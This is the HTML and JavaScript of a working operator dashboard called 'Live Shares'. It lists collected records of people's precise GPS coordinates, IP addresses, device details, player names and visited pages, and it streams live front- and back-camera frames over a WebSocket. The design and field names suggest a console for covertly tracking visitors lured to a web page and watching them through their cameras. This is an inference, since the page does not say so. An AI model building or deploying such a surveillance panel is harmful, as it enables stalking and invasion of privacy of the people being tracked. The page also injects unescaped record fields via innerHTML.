<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta http-equiv="Cache-Control" content="no-store" />
  <title>Live Shares Dashboard</title>
  <style>
    body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; background: #0b1020; color: #e5f4ff; }
    .wrap { max-width: 960px; margin: 0 auto; padding: 24px; }
    h1 { font-size: 1.25rem; margin: 0 0 12px; }
    .panel { background: #141a2d; border: 1px solid #1f2a44; border-radius: 12px; padding: 16px; margin-top: 16px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { text-align: left; border-bottom: 1px solid #1f2a44; padding: 8px; font-size: 14px; }
    a { color: #22d3ee; }
    .muted { color: #9fb2cc; }
    
    /* Live Camera Streaming Styles */
    .camera-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin-top: 16px; }
    .camera-feed { background: #141a2d; border: 1px solid #1f2a44; border-radius: 12px; padding: 16px; }
    .camera-feed h3 { margin: 0 0 12px; font-size: 14px; color: #22d3ee; }
    .camera-video { width: 100%; height: 200px; background: #000; border-radius: 8px; object-fit: cover; }
    .camera-info { margin-top: 8px; font-size: 12px; color: #9fb2cc; }
    .status-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
    .status-online { background: #10b981; }
    .status-offline { background: #ef4444; }
    .location-info { margin-top: 8px; font-size: 12px; color: #f59e0b; }
  </style>
  <meta name="color-scheme" content="light dark" />
</head>
<body>
  <div class="wrap">
    <h1>Live Shares <span style="font-size: 0.6em; color: #9fb2cc; font-weight: normal;">v1.1.06</span></h1>
    <div class="muted">Paginated view. Newest first. Click Refresh to update.</div>
    <div style="margin:8px 0; display:flex; gap:8px; align-items:center;">
      <button id="logout">Logout</button>
      <button id="refresh">Refresh</button>
      <span id="authMsg" class="muted"></span>
    </div>
    <div style="margin:8px 0; display:flex; gap:8px; align-items:center;">
      <button id="prev">Prev</button>
      <button id="next">Next</button>
      <span id="pageInfo" class="muted"></span>
    </div>
    <div id="status" class="muted" style="margin-top:8px;">Loading…</div>

    <!-- Live Camera Streams Section -->
    <div class="panel">
      <h2>Live Camera Streams</h2>
      <div class="camera-grid" id="cameraGrid">
        <div class="camera-feed">
          <h3>No active streams</h3>
          <div class="camera-video" style="display: flex; align-items: center; justify-content: center; color: #9fb2cc;">
            Waiting for camera connections...
          </div>
        </div>
      </div>
    </div>

    <div class="panel">
      <table>
        <thead>
          <tr>
            <th>#</th>
            <th>When</th>
            <th>Lat</th>
            <th>Lng</th>
            <th>Acc (m)</th>
            <th>Name</th>
            <th>Device / UA</th>
            <th>IP</th>
            <th>Page</th>
            <th>Map</th>
            <th>Camera</th>
          </tr>
        </thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
    <div id="updated" class="muted">Updated: —</div>
  </div>

  <script>
    const tbody = document.getElementById('tbody');
    const status = document.getElementById('status');
    const prevBtn = document.getElementById('prev');
    const nextBtn = document.getElementById('next');
    const pageInfo = document.getElementById('pageInfo');
    const logoutBtn = document.getElementById('logout');
    const refreshBtn = document.getElementById('refresh');
    const authMsg = document.getElementById('authMsg');
    const updatedEl = document.getElementById('updated');
    let currentPage = 1;
    const pageSize = 50;

    async function logout() {
      try { await fetch('/api/logout', { method: 'POST' }); authMsg.textContent = 'Logged out'; setTimeout(()=>location.href='/login.html', 300); }
      catch { authMsg.textContent = 'Logout failed'; }
    }
    logoutBtn.addEventListener('click', logout);

    function deviceLabel(rec) {
      const d = rec.deviceSummary || rec.device || {};
      const brands = Array.isArray(d.brands)
        ? d.brands.map(b => `${b.brand}${b.version ? ' ' + b.version : ''}`).join(', ')
        : (d.brand || '');
      const plat = d.platformHint || d.platform || '';
      const mobile = typeof d.mobile === 'boolean' ? (d.mobile ? 'Mobile' : 'Desktop') : (d.isMobile ? 'Mobile' : '');
      const ua = rec.userAgent || d.userAgent || '';
      return [brands, plat, mobile, ua].filter(Boolean).join(' · ') || '—';
    }

    function mapLink(lat, lng) {
      if (typeof lat !== 'number' || typeof lng !== 'number') return '—';
      const url = `https://www.google.com/maps?q=${lat},${lng}`;
      return `<a href="${url}" target="_blank" rel="noopener">Open</a>`;
    }

    async function load() {
      try {
        status.textContent = 'Updating…';
        const res = await fetch(`/admin/recent?page=${currentPage}&pageSize=${pageSize}`, { cache: 'no-store' });
        if (res.status === 401) { window.location.href = '/login.html'; return; }
        const data = await res.json();
        const rows = data.items || [];
        const total = data.total || rows.length;
        pageInfo.textContent = `Page ${currentPage} · ${rows.length} items · Total ${total}`;
        tbody.innerHTML = rows.map((r, idx) => {
          const serial = (currentPage - 1) * pageSize + idx + 1;
          const when = r.receivedAtIso ? new Date(r.receivedAtIso).toLocaleString(undefined, { hour12: false, timeZoneName: 'short' }) : '—';
          const lat = r.gps && typeof r.gps.latitude === 'number' ? r.gps.latitude.toFixed(6) : '—';
          const lng = r.gps && typeof r.gps.longitude === 'number' ? r.gps.longitude.toFixed(6) : '—';
          const acc = r.gps && r.gps.accuracyMeters != null ? Math.round(r.gps.accuracyMeters) : '—';
          const dev = deviceLabel(r);
          const name = r.playerName || '—';
          const ip = r.ip || '—';
          const page = r.page || '—';
          const map = mapLink(r?.gps?.latitude, r?.gps?.longitude);
          const cam = r.cameraRoom ? `<a href="/camera.html?room=${encodeURIComponent(r.cameraRoom)}" target="_blank" rel="noopener">Open</a>` : '—';
          return `<tr><td>${serial}</td><td>${when}</td><td>${lat}</td><td>${lng}</td><td>${acc}</td><td>${name}</td><td>${dev}</td><td>${ip}</td><td>${page}</td><td>${map}</td><td>${cam}</td></tr>`;
        }).join('');
        const stamp = new Date().toLocaleString(undefined, { hour12: false, timeZoneName: 'short' });
        updatedEl.textContent = `Refreshed: ${stamp}`;
        status.textContent = '';
      } catch (e) {
        status.textContent = 'Failed to load';
      }
    }

    load();
    refreshBtn.addEventListener('click', load);

    prevBtn.addEventListener('click', () => { if (currentPage > 1) { currentPage -= 1; load(); } });
    nextBtn.addEventListener('click', () => { currentPage += 1; load(); });

    // Live Camera Streaming
    const cameraGrid = document.getElementById('cameraGrid');
    const activeStreams = new Map(); // room -> { front: img, back: img, location: {}, lastSeen: timestamp }

    function connectToCameraStreams() {
      const ws = new WebSocket(`${location.protocol.startsWith('https') ? 'wss' : 'ws'}://${location.host}/ws?room=dashboard`);
      
      ws.onopen = () => {
        console.log('Dashboard WebSocket connected');
      };
      
      ws.onmessage = (ev) => {
        try {
          const data = JSON.parse(ev.data);
          
          if (data.type === 'video_frame') {
            handleVideoFrame(data);
          } else if (data.type === 'location') {
            handleLocationUpdate(data);
          }
        } catch (error) {
          console.error('Error handling WebSocket message:', error);
        }
      };
      
      ws.onclose = () => {
        console.log('Dashboard WebSocket disconnected, reconnecting...');
        setTimeout(connectToCameraStreams, 3000);
      };
      
      ws.onerror = (error) => {
        console.error('Dashboard WebSocket error:', error);
      };
    }

    function handleVideoFrame(data) {
      const { room, camera, data: imageData, timestamp } = data;
      
      if (!activeStreams.has(room)) {
        activeStreams.set(room, {
          front: null,
          back: null,
          location: {},
          lastSeen: timestamp
        });
      }
      
      const stream = activeStreams.get(room);
      stream.lastSeen = timestamp;
      
      // Create or update image element
      if (!stream[camera]) {
        stream[camera] = document.createElement('img');
        stream[camera].className = 'camera-video';
        stream[camera].style.objectFit = 'cover';
      }
      
      stream[camera].src = imageData;
      updateCameraGrid();
    }

    function handleLocationUpdate(data) {
      const { room, latitude, longitude, accuracy, timestamp } = data;
      
      if (!activeStreams.has(room)) {
        activeStreams.set(room, {
          front: null,
          back: null,
          location: {},
          lastSeen: timestamp
        });
      }
      
      const stream = activeStreams.get(room);
      stream.location = { latitude, longitude, accuracy };
      stream.lastSeen = timestamp;
      updateCameraGrid();
    }

    function updateCameraGrid() {
      const now = Date.now();
      const timeout = 30000; // 30 seconds timeout
      
      // Remove old streams
      for (const [room, stream] of activeStreams.entries()) {
        if (now - stream.lastSeen > timeout) {
          activeStreams.delete(room);
        }
      }
      
      if (activeStreams.size === 0) {
        cameraGrid.innerHTML = `
          <div class="camera-feed">
            <h3>No active streams</h3>
            <div class="camera-video" style="display: flex; align-items: center; justify-content: center; color: #9fb2cc;">
              Waiting for camera connections...
            </div>
          </div>
        `;
        return;
      }
      
      // Update grid with active streams
      cameraGrid.innerHTML = '';
      
      for (const [room, stream] of activeStreams.entries()) {
        const feedDiv = document.createElement('div');
        feedDiv.className = 'camera-feed';
        
        const roomId = room.substring(0, 8) + '...';
        feedDiv.innerHTML = `
          <h3>
            <span class="status-indicator status-online"></span>
            Room: ${roomId}
          </h3>
          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
            <div>
              <div style="font-size: 12px; color: #9fb2cc; margin-bottom: 4px;">Front Camera</div>
              ${stream.front ? `<img src="${stream.front.src}" class="camera-video" style="height: 150px;">` : '<div class="camera-video" style="height: 150px; display: flex; align-items: center; justify-content: center; color: #9fb2cc;">No front camera</div>'}
            </div>
            <div>
              <div style="font-size: 12px; color: #9fb2cc; margin-bottom: 4px;">Back Camera</div>
              ${stream.back ? `<img src="${stream.back.src}" class="camera-video" style="height: 150px;">` : '<div class="camera-video" style="height: 150px; display: flex; align-items: center; justify-content: center; color: #9fb2cc;">No back camera</div>'}
            </div>
          </div>
          <div class="camera-info">
            Last seen: ${new Date(stream.lastSeen).toLocaleTimeString()}
          </div>
          ${stream.location.latitude ? `
            <div class="location-info">
              📍 ${stream.location.latitude.toFixed(6)}, ${stream.location.longitude.toFixed(6)} 
              (Accuracy: ${Math.round(stream.location.accuracy)}m)
            </div>
          ` : ''}
        `;
        
        cameraGrid.appendChild(feedDiv);
      }
    }

    // Start camera streaming
    connectToCameraStreams();
    
    // Update grid every 5 seconds to clean up old streams
    setInterval(updateCameraGrid, 5000);
  </script>
</body>
</html>


